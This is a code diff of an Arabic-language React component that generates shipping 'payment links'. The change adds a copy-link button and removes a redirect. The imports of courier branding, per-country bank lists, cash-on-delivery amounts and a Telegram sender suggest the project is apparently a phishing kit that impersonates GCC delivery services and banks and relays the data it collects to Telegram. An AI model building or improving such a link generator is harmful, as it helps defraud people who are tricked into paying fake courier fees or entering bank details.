@@ -10,7 +10,7 @@ import { getCountryByCode } from "@/lib/countries";
 import { getServicesByCountry } from "@/lib/gccShippingServices";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getBanksByCountry } from "@/lib/banks";
-import { Package, MapPin, DollarSign, Hash, Building2 } from "lucide-react";
+import { Package, MapPin, DollarSign, Hash, Building2, Copy, Check } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import TelegramTest from "@/components/TelegramTest";
@@ -28,6 +28,8 @@ const CreateShippingLink = () => {
   const [packageDescription, setPackageDescription] = useState("");
   const [codAmount, setCodAmount] = useState("");
   const [selectedBank, setSelectedBank] = useState("");
+  const [createdLink, setCreatedLink] = useState<string | null>(null);
+  const [copied, setCopied] = useState(false);
   
   // Get banks for the selected country
   const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
@@ -83,6 +85,10 @@ const CreateShippingLink = () => {
         timestamp: new Date().toISOString()
       });
 
+      // Store the created link
+      const paymentUrl = `${window.location.origin}/r/${country}/${link.type}/${link.id}?service=${selectedService}`;
+      setCreatedLink(paymentUrl);
+      
       if (telegramResult.success) {
         toast({
           title: "تم الإرسال بنجاح",
@@ -96,11 +102,20 @@ const CreateShippingLink = () => {
           variant: "destructive",
         });
       }
-
-      // Navigate to payment page with service parameter
-      navigate(`/pay/${link.id}/recipient?service=${selectedService}`);
     } catch (error) {
       console.error("Error creating link:", error);
+    }
+  };
+  
+  const handleCopy = () => {
+    if (createdLink) {
+      navigator.clipboard.writeText(createdLink);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+      toast({
+        title: "تم النسخ!",
+        description: "تم نسخ الرابط إلى الحافظة",
+      });
     }
   };
   
@@ -266,6 +281,35 @@ const CreateShippingLink = () => {
                 )}
               </Button>
             </form>
+            
+            {/* Created Link with Copy Button */}
+            {createdLink && (
+              <div className="mt-4 p-3 bg-green-50 dark:bg-green-950/20 border border-green-200 dark:border-green-800 rounded-lg">
+                <p className="text-sm text-green-800 dark:text-green-200 mb-2 font-medium">
+                  ✅ تم إنشاء الرابط بنجاح!
+                </p>
+                <div className="bg-white dark:bg-gray-900 p-2 rounded border border-gray-200 dark:border-gray-700 mb-3 break-all text-xs">
+                  {createdLink}
+                </div>
+                <Button
+                  onClick={handleCopy}
+                  className="w-full"
+                  variant="default"
+                >
+                  {copied ? (
+                    <>
+                      <Check className="w-4 h-4 ml-2" />
+                      <span className="text-sm">تم النسخ!</span>
+                    </>
+                  ) : (
+                    <>
+                      <Copy className="w-4 h-4 ml-2" />
+                      <span className="text-sm">نسخ الرابط</span>
+                    </>
+                  )}
+                </Button>
+              </div>
+            )}
           </Card>
         </div>
       </div>
